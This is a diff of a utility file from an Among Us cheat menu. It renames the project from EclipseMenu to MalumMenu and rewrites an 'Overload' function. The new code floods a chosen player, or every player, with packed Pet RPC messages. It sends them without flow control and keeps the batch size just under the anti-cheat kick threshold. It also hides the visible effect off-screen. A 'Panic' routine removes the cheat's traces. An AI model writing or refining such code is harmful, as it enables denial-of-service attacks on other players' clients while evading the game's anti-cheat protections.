@@ -15,7 +15,7 @@ using System.Runtime.CompilerServices;
 using AmongUs.InnerNet.GameDataMessages;
 using Il2CppInterop.Runtime.Injection;
 
-namespace EclipseMenu;
+namespace MalumMenu;
 
 public static class Utils
 {
@@ -218,9 +218,9 @@ public static class Utils
                 DestroyableSingleton<FriendsListManager>.Instance.SetFriendButtonColor(true);
             }
             if (DestroyableSingleton<HudManager>.Instance.Chat.chatNotification.gameObject.activeSelf)
-			{
-				DestroyableSingleton<HudManager>.Instance.Chat.chatNotification.Close();
-			}
+                        {
+                                DestroyableSingleton<HudManager>.Instance.Chat.chatNotification.Close();
+                        }
         }
 
     }
@@ -261,21 +261,90 @@ public static class Utils
         }
     }
 
-    // Overloads target with set strength using malformed RPCs
+    // Returns the max number of nested RPCs that can be in a GameData message
+    // without getting kicked by AC
+    public static int GetMaxRpcPackingLimit()
+    {
+        int num = 0;
+
+        if (isClient && AmongUsClient.Instance.AmHost)
+        {
+            num = GameManager.Instance.LogicOptions.MaxPlayers * 2;
+        }
+
+        return 10 + num;
+    }
+
+    // Overloads target with set strength using Pet RPCs that
+    // repeatedly restart the hand-petting animation, preventing old petting coroutines
+    // from resolving
     public static void Overload(int targetId, int strength)
     {
-        // ClimbLadder RPC is only effective in maps with no ladders or in lobby
-        // SetStartCounter RPC is only effective when NOT in lobby
+        if (strength < 1) return;
 
-        bool hasLadders = isShip && (isFungleMap || isAirshipMap);
+        int maxRpc = GetMaxRpcPackingLimit();
 
-        uint netId = hasLadders ? PlayerControl.LocalPlayer.NetId : PlayerControl.LocalPlayer.MyPhysics.NetId;
-        byte rpcCall = hasLadders ? (byte)RpcCalls.SetStartCounter : (byte)RpcCalls.ClimbLadder;
+        uint netId = PlayerControl.LocalPlayer.MyPhysics.NetId;
+        byte rpcCall = (byte)RpcCalls.Pet;
 
-        for (int i = 0; i < strength; i++) // Strength = Num of malformed RPCs sent
+        if (strength <= maxRpc)
         {
-            MessageWriter overloadMsg = AmongUsClient.Instance.StartRpcImmediately(netId, rpcCall, SendOption.None, targetId);
-            AmongUsClient.Instance.FinishRpcImmediately(overloadMsg);
+            // SendOption.None has no flow control, allowing for flooding without limits
+
+            var messageWriter = MessageWriter.Get(SendOption.None);
+
+            if (targetId < 0) // -1 = Broadcast
+            {
+                messageWriter.StartMessage(Tags.GameData);
+                messageWriter.Write(AmongUsClient.Instance.GameId);
+            }
+            else
+            {
+                messageWriter.StartMessage(Tags.GameDataTo);
+                messageWriter.Write(AmongUsClient.Instance.GameId);
+                messageWriter.WritePacked(targetId);
+            }
+
+            for (var msg = 0; msg < strength; msg++)
+            {
+                messageWriter.StartMessage((byte)GameDataTypes.RpcFlag);
+
+                messageWriter.WritePacked(netId);
+
+                messageWriter.Write(rpcCall);
+
+                // Use LocalPlayer.GetTruePosition() as the petting position
+                // to minimize WalkPlayerTo delay and start the hand-petting animation immediately
+
+                NetHelpers.WriteVector2(PlayerControl.LocalPlayer.GetTruePosition(), messageWriter);
+
+                // Pet position is decoded as (-50, -50) on target clients
+                // This keeps the hand-petting animation out of normal view
+
+                messageWriter.Write((ushort)0);
+
+                messageWriter.Write((ushort)0);
+
+                messageWriter.EndMessage();
+            }
+
+            messageWriter.EndMessage();
+
+            AmongUsClient.Instance.connection.Send(messageWriter);
+
+            messageWriter.Recycle();
+        }
+        else
+        {
+            int strengthGroups = strength / maxRpc;
+            int remainder = strength % maxRpc;
+
+            for (int group = 0; group < strengthGroups; group++)
+            {
+                Overload(targetId, maxRpc);
+            }
+
+            Overload(targetId, remainder);
         }
     }
 
@@ -293,7 +362,7 @@ public static class Utils
     {
 
         Vector2 vector = target.GetTruePosition() - source.GetTruePosition();
-		float magnitude = vector.magnitude;
+                float magnitude = vector.magnitude;
 
         return magnitude;
 
@@ -538,13 +607,13 @@ public static class Utils
         var players = PlayerControl.AllPlayerControls.ToArray();
 
         for (int i = 0; i < players.Count; i++)
-		{   NetworkedPlayerInfo playerData = players[i].Data;
+                {   NetworkedPlayerInfo playerData = players[i].Data;
 
-			if (playerData.ClientId == clientId)
-			{
-				return playerData;
-			}
-		}
+                        if (playerData.ClientId == clientId)
+                        {
+                                return playerData;
+                        }
+                }
 
         return null; // Returns null if no matching player is found
     }
@@ -607,7 +676,7 @@ public static class Utils
         }
         catch
         {
-            EclipseMenu.Log.LogError($"Failed to read Texture: {path}");
+            MalumMenu.Log.LogError($"Failed to read Texture: {path}");
         }
         return null;
     }
@@ -628,7 +697,7 @@ public static class Utils
         }
         catch
         {
-            EclipseMenu.Log.LogError($"Failed to read Texture: {path}");
+            MalumMenu.Log.LogError($"Failed to read Texture: {path}");
         }
         return null;
     }
@@ -636,8 +705,8 @@ public static class Utils
     // Opens the config file in the default text editor
     public static void OpenConfigFile()
     {
-        var configFilePath = EclipseMenu.Plugin.Config.ConfigFilePath;
-        var configEditor = EclipseMenu.configEditor.Value;
+        var configFilePath = MalumMenu.Plugin.Config.ConfigFilePath;
+        var configEditor = MalumMenu.configEditor.Value;
 
         if (!string.IsNullOrWhiteSpace(configEditor))
         {
@@ -655,17 +724,17 @@ public static class Utils
                 }
                 catch (Exception ex)
                 {
-                    EclipseMenu.Log.LogError(ex.Message);
+                    MalumMenu.Log.LogError(ex.Message);
                 }
             }
             else
             {
-                EclipseMenu.Log.LogError("Configuration file does not exist");
+                MalumMenu.Log.LogError("Configuration file does not exist");
             }
         }
         else
         {
-            EclipseMenu.Log.LogError("Configuration editor not specified");
+            MalumMenu.Log.LogError("Configuration editor not specified");
         }
     }
 
@@ -675,7 +744,7 @@ public static class Utils
         public static void Create()
         {
             ClassInjector.RegisterTypeInIl2Cpp<PanicCleaner>();
-            var go = new GameObject("EclipseMenu_PanicCleaner");
+            var go = new GameObject("MalumMenu_PanicCleaner");
             go.hideFlags = HideFlags.HideAndDontSave;
             go.AddComponent<PanicCleaner>();
         }
@@ -684,14 +753,14 @@ public static class Utils
         // This allows some patches to run for a last time and finish properly
         private void LateUpdate()
         {
-            try { Harmony.UnpatchID(EclipseMenu.Id); } catch { }
+            try { Harmony.UnpatchID(MalumMenu.Id); } catch { }
             Destroy(gameObject);
         }
     }
 
     public static void Panic()
     {
-        EclipseMenu.isPanicked = true;
+        MalumMenu.isPanicked = true;
 
         CheatToggles.DisableAll();
 
@@ -705,16 +774,16 @@ public static class Utils
             SceneManager.LoadScene(scene.name);
         }
 
-        UnityEngine.Object.Destroy(EclipseMenu.menuUI);
+        UnityEngine.Object.Destroy(MalumMenu.menuUI);
 
-        UnityEngine.Object.Destroy(EclipseMenu.consoleUI);
-        UnityEngine.Object.Destroy(EclipseMenu.overloadUI);
-        UnityEngine.Object.Destroy(EclipseMenu.doorsUI);
-        UnityEngine.Object.Destroy(EclipseMenu.tasksUI);
-        UnityEngine.Object.Destroy(EclipseMenu.protectUI);
-        // UnityEngine.Object.Destroy(EclipseMenu.rolesUI);
+        UnityEngine.Object.Destroy(MalumMenu.consoleUI);
+        UnityEngine.Object.Destroy(MalumMenu.overloadUI);
+        UnityEngine.Object.Destroy(MalumMenu.doorsUI);
+        UnityEngine.Object.Destroy(MalumMenu.tasksUI);
+        UnityEngine.Object.Destroy(MalumMenu.protectUI);
+        // UnityEngine.Object.Destroy(MalumMenu.rolesUI);
 
-        UnityEngine.Object.Destroy(EclipseMenu.keybindListener);
+        UnityEngine.Object.Destroy(MalumMenu.keybindListener);
 
         PanicCleaner.Create();
     }
